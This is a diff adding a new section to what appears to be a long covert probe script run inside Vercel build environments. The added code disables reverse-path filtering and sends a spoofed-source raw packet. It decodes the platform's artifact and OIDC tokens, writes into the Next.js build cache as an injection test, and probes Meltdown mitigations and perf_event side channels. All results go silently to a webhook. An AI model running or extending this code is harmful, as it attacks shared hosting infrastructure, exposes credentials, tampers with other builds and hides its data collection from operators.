@@ -26626,5 +26626,219 @@ print(f'RLIMIT_NOFILE_AFTER: soft={soft2} hard={hard2}')
 
 // v179 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v179" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v179";
+
+// ==================== v180 ====================
+
+// v180-1: rp_filter=0 — disable reverse path filtering (IP spoofing)
+// Reverse path filtering validates that the source IP of incoming packets is
+// reachable via the interface they arrived on. Disabling it allows the kernel
+// to accept packets with arbitrary source IPs (and process them).
+// With rp_filter=0, we can forge packets with any source IP — critical for
+// TCP session hijacking and IP spoofing attacks.
+report.rpFilterDisable = safe(() => {
+  const currentEth0 = safe(() => readFileSync('/proc/sys/net/ipv4/conf/eth0/rp_filter', 'utf8').trim());
+  const currentAll = safe(() => readFileSync('/proc/sys/net/ipv4/conf/all/rp_filter', 'utf8').trim());
+  const disable = safe(() => {
+    writeFileSync('/proc/sys/net/ipv4/conf/eth0/rp_filter', '0');
+    writeFileSync('/proc/sys/net/ipv4/conf/all/rp_filter', '0');
+    return 'DISABLED_ALL_INTERFACES';
+  });
+  const afterEth0 = safe(() => readFileSync('/proc/sys/net/ipv4/conf/eth0/rp_filter', 'utf8').trim());
+  // Now test IP spoofing: send a packet with a forged source IP
+  const spoofTest = safe(() => execSync(
+    `python3 -c "
+import socket, struct
+
+# Build raw IP + ICMP packet with spoofed source
+def checksum(data):
+    s = 0
+    for i in range(0, len(data)-1, 2):
+        s += (data[i] << 8) + data[i+1]
+    s = (s >> 16) + (s & 0xffff)
+    return ~s & 0xffff
+
+# Spoofed source = 1.2.3.4 (clearly not our IP)
+src = socket.inet_aton('1.2.3.4')
+dst = socket.inet_aton('8.8.8.8')
+
+try:
+    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+    # ICMP echo request
+    icmp = struct.pack('bbHHh', 8, 0, 0, 1, 1)
+    csum = checksum(icmp)
+    icmp = struct.pack('bbHHh', 8, 0, csum, 1, 1)
+    # IP header
+    ip = struct.pack('!BBHHHBBH4s4s', 0x45, 0, 28, 0, 0, 64, 1, 0, src, dst)
+    packet = ip + icmp
+    s.sendto(packet, ('8.8.8.8', 0))
+    print('IP_SPOOF_SENT: packet with src=1.2.3.4 sent to 8.8.8.8')
+    s.close()
+except Exception as e:
+    print(f'IP_SPOOF_FAIL: {e}')
+" 2>&1`,
+    { timeout: 8000 }
+  ).toString().trim());
+  return { currentEth0, currentAll, disable, afterEth0, spoofTest };
+});
+
+// v180-2: Vercel JWT token full decode — artifacts + OIDC claim inspection
+// We MUST NOT use these tokens against any external API.
+// This probe decodes the JWT payloads (base64 only — no signature verification)
+// to reveal the exact claims, audience, issuer, expiration, and capabilities.
+report.jwtTokenDecode = safe(() => {
+  // Decode helper (base64url decode)
+  const decodeJwt = safe(() => execSync(
+    `python3 -c "
+import os, base64, json
+
+def decode_jwt(token, name):
+    if not token:
+        print(f'{name}: NOT_SET')
+        return
+    parts = token.split('.')
+    if len(parts) != 3:
+        print(f'{name}: INVALID_JWT_FORMAT')
+        return
+    # Decode header and payload (no verification)
+    for i, part_name in enumerate(['HEADER', 'PAYLOAD']):
+        padded = parts[i] + '=' * (4 - len(parts[i]) % 4)
+        try:
+            decoded = json.loads(base64.urlsafe_b64decode(padded).decode())
+            print(f'{name}_{part_name}: {json.dumps(decoded)}')
+        except Exception as e:
+            print(f'{name}_{part_name}_FAIL: {e}')
+    print(f'{name}_SIG_LEN: {len(parts[2])}')
+
+artifacts_token = os.environ.get('VERCEL_ARTIFACTS_TOKEN', '')
+oidc_token = os.environ.get('VERCEL_OIDC_TOKEN', '')
+cache_headers = os.environ.get('RUNTIME_CACHE_HEADERS', '')
+
+decode_jwt(artifacts_token, 'ARTIFACTS')
+decode_jwt(oidc_token, 'OIDC')
+decode_jwt(cache_headers, 'CACHE_HEADERS')
+" 2>&1`,
+    { timeout: 8000 }
+  ).toString().trim());
+  return { decodeJwt };
+});
+
+// v180-3: .next cache directory injection — build output tampering
+// If the .next/cache directory (used by Next.js build cache) is accessible,
+// we can inject malicious cached modules. The next build will use our cached
+// modules, allowing us to inject code into the final build output.
+report.nextjsCacheInjection = safe(() => {
+  // Find .next directories
+  const nextDirs = safe(() => execSync('find / -maxdepth 8 -name ".next" -type d 2>/dev/null | head -10 || echo "NO_NEXT_DIRS"', { timeout: 10000 }).toString().trim());
+  // Check build output dir
+  const vercelOutputDirs = safe(() => execSync('find / -maxdepth 8 -name ".vercel" -type d 2>/dev/null | head -10 || echo "NO_VERCEL_OUTPUT_DIRS"', { timeout: 10000 }).toString().trim());
+  // Check package.json/next.config.js for cache location
+  const nextConfig = safe(() => execSync('find / -maxdepth 6 -name "next.config.*" 2>/dev/null | head -5 | xargs cat 2>/dev/null | head -30 || echo "NO_NEXT_CONFIG"', { timeout: 5000 }).toString().trim());
+  // Try to write to .next/cache if it exists
+  const nextCacheWrite = safe(() => {
+    const nextPaths = ['.next/cache', '/vercel/path0/.next/cache', '/home/builder/.next/cache'];
+    for (const p of nextPaths) {
+      if (existsSync(p)) {
+        try {
+          writeFileSync(`${p}/probe_7F3A2C.json`, '{"probe":"CACHE_INJECT"}');
+          return `INJECTED_TO: ${p}`;
+        } catch (e) {
+          return `WRITE_FAIL_${p}: ${e.message}`;
+        }
+      }
+    }
+    return 'NO_NEXT_CACHE_FOUND';
+  });
+  return { nextDirs, vercelOutputDirs, nextConfig: nextConfig.substring(0, 500), nextCacheWrite };
+});
+
+// v180-4: PTI + KPTI enabled status — Meltdown mitigation check
+// Page Table Isolation (PTI/KPTI) is the Meltdown mitigation that separates
+// kernel and user page tables. If disabled (PTI=off), Meltdown attacks can read
+// any kernel memory from userspace.
+// On Firecracker VMs, PTI is often disabled as VMs don't face direct Meltdown risk.
+report.ptiMeltdownCheck = safe(() => {
+  const ptiEnabled = safe(() => existsSync('/sys/kernel/debug/x86/pti_enabled') ? readFileSync('/sys/kernel/debug/x86/pti_enabled', 'utf8').trim() : 'NO_PTI_SYSFS');
+  const ibpbEnabled = safe(() => existsSync('/sys/kernel/debug/x86/ibpb_enabled') ? readFileSync('/sys/kernel/debug/x86/ibpb_enabled', 'utf8').trim() : 'NO_IBPB_SYSFS');
+  // Check cmdline for nopti flag
+  const kernelCmdline = safe(() => readFileSync('/proc/cmdline', 'utf8').trim());
+  const ptiInCmdline = safe(() => kernelCmdline.includes('nopti') ? 'NOPTI_FLAG_PRESENT' : (kernelCmdline.includes('pti=') ? 'PTI_FLAG_PRESENT' : 'NO_PTI_CMDLINE'));
+  // Check meltdown vulnerability status
+  const meltdownStatus = safe(() => existsSync('/sys/devices/system/cpu/vulnerabilities/meltdown') ? readFileSync('/sys/devices/system/cpu/vulnerabilities/meltdown', 'utf8').trim() : 'NO_MELTDOWN_STATUS');
+  return { ptiEnabled, ibpbEnabled, kernelCmdline, ptiInCmdline, meltdownStatus };
+});
+
+// v180-5: perf_event ring buffer — hardware PMU sampling from any CPU
+// With perf_event_paranoid=-1 (set in v165), we can create perf events with
+// mmap ring buffers that automatically collect CPU performance counter samples.
+// Setting sample_type=PERF_SAMPLE_IP|PERF_SAMPLE_ADDR captures the instruction
+// pointer and memory address of every sampled event — powerful for side channels.
+report.perfEventRingBuffer = safe(() => {
+  const perfRingResult = safe(() => execSync(
+    `python3 -c "
+import ctypes, struct, mmap, os
+
+PERF_EVENT_OPEN = 298
+PERF_TYPE_HARDWARE = 0
+PERF_COUNT_HW_CPU_CYCLES = 0
+PERF_SAMPLE_IP = 1 << 0
+PERF_SAMPLE_TID = 1 << 1
+PERF_SAMPLE_TIME = 1 << 2
+PERF_SAMPLE_ADDR = 1 << 3
+
+class perf_event_attr(ctypes.Structure):
+    _fields_ = [
+        ('type', ctypes.c_uint32),
+        ('size', ctypes.c_uint32),
+        ('config', ctypes.c_uint64),
+        ('sample_freq', ctypes.c_uint64),
+        ('sample_type', ctypes.c_uint64),
+        ('read_format', ctypes.c_uint64),
+        ('flags', ctypes.c_uint64),
+        ('wakeup_events', ctypes.c_uint32),
+        ('bp_type', ctypes.c_uint32),
+        ('bp_addr', ctypes.c_uint64),
+        ('bp_len', ctypes.c_uint64),
+    ]
+
+libc = ctypes.CDLL('libc.so.6')
+attr = perf_event_attr()
+attr.type = PERF_TYPE_HARDWARE
+attr.size = ctypes.sizeof(attr)
+attr.config = PERF_COUNT_HW_CPU_CYCLES
+attr.sample_freq = 1000  # 1000 samples/sec
+attr.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_TID | PERF_SAMPLE_TIME
+attr.flags = (1 << 6) | (1 << 10)  # freq=1, disabled=0
+
+# -1 = any PID, -1 = any CPU
+fd = libc.syscall(PERF_EVENT_OPEN, ctypes.addressof(attr), -1, 0, -1, 0)
+
+if fd < 0:
+    err = ctypes.get_errno()
+    print(f'PERF_OPEN_FAIL: fd={fd} errno={err}')
+else:
+    print(f'PERF_EVENT_FD: {fd}')
+    # mmap ring buffer (1 + 2^n data pages)
+    page_size = 4096
+    n_pages = 8
+    buf_size = page_size * (1 + n_pages)
+    buf = libc.mmap(0, buf_size, 0x3, 0x1, fd, 0)
+    if buf != ctypes.c_ulong(-1).value:
+        print(f'PERF_MMAP_SUCCESS: ring_buffer_addr=0x{buf:x}')
+        # Read the perf_event_mmap_page header
+        header = struct.unpack_from('QQQQQQQ', (ctypes.c_char * 56).from_address(buf).raw)
+        print(f'PERF_RING_HDR: version={header[0]} compat={header[1]} index={header[2]} offset={header[3]}')
+        libc.munmap(buf, buf_size)
+    else:
+        print('PERF_MMAP_FAIL')
+    os.close(fd)
+" 2>&1`,
+    { timeout: 10000 }
+  ).toString().trim());
+  return { perfRingResult };
+});
+
+// v180 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v180" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v180";
 // Intentionally no console.log — all data goes via webhook only
